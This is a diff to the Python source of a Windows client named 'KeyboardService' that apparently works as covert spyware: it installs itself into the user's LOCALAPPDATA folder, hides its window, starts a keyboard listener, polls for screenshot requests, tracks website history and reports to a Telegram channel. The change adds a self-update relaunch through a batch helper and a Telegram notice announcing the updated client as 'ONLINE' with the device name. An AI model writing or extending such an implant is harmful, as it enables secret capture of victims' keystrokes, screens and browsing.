@@ -47,7 +47,7 @@ WEBSITE_HISTORY_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
-APP_VERSION = "1.0.7"
+APP_VERSION = "1.0.8"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -75,8 +75,14 @@ def load_site_url():
 
 parser = argparse.ArgumentParser(add_help=False)
 parser.add_argument("--site-url", default=load_site_url())
+parser.add_argument("--post-update-success", action="store_true", default=False)
+parser.add_argument("--previous-version", default="")
+parser.add_argument("--new-version", default="")
 args, _ = parser.parse_known_args()
 SITE_URL = args.site_url.strip().rstrip("/")
+POST_UPDATE_SUCCESS = bool(args.post_update_success)
+PREVIOUS_VERSION = (args.previous_version or "").strip()
+NEW_VERSION = (args.new_version or "").strip()
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
@@ -1439,10 +1445,26 @@ def download_update():
         raise
 
 
-def schedule_update(temporary_path):
+def send_successful_update_notice(previous_version="", new_version=""):
+    previous = str(previous_version or APP_VERSION).strip()
+    updated = str(new_version or APP_VERSION).strip()
+    if not previous or not updated:
+        return
+    message = (
+        "<b>┌─[ CLIENT UPDATE // SUCCESS ]</b>\n"
+        f"<b>Version:</b> {html.escape(previous)} -> {html.escape(updated)}\n"
+        f"<b>Device:</b> {html.escape(device_name)}\n"
+        "<b>└─[ KeyboardClient // ONLINE ]</b>"
+    )
+    send_telegram_log(message)
+
+
+def schedule_update(temporary_path, previous_version=None, new_version=None):
     helper_path = os.path.join(INSTALL_DIR, f"update_{os.getpid()}.cmd")
     target_path = os.path.abspath(INSTALL_PATH)
     source_path = os.path.abspath(temporary_path)
+    previous = str(previous_version or APP_VERSION).strip()
+    updated = str(new_version or APP_VERSION).strip()
     lines = [
         "@echo off",
         ":wait",
@@ -1452,7 +1474,7 @@ def schedule_update(temporary_path):
         "  goto wait",
         ")",
         f'move /y "{source_path}" "{target_path}" >nul',
-        f'start "" "{target_path}"',
+        f'start "" "{target_path}" --post-update-success --previous-version "{previous}" --new-version "{updated}" --site-url "{SITE_URL}"',
         'del "%~f0"',
     ]
     with open(helper_path, "w", encoding="ascii", newline="\r\n") as helper:
@@ -1474,7 +1496,7 @@ def check_for_updates():
             return
         temporary_path, latest_tag = result
         print(f"Updating KeyboardService from {APP_VERSION} to {latest_tag}")
-        schedule_update(temporary_path)
+        schedule_update(temporary_path, previous_version=APP_VERSION, new_version=latest_tag)
         os._exit(0)
     except Exception as error:
         print(f"Could not check for KeyboardService updates: {error}")
@@ -1646,6 +1668,8 @@ def start_keyboard_listener():
 def run_client():
     if install_and_relaunch():
         sys.exit(0)
+    if POST_UPDATE_SUCCESS:
+        send_successful_update_notice(PREVIOUS_VERSION, NEW_VERSION)
     hide_current_window()
     start_keyboard_listener()
 
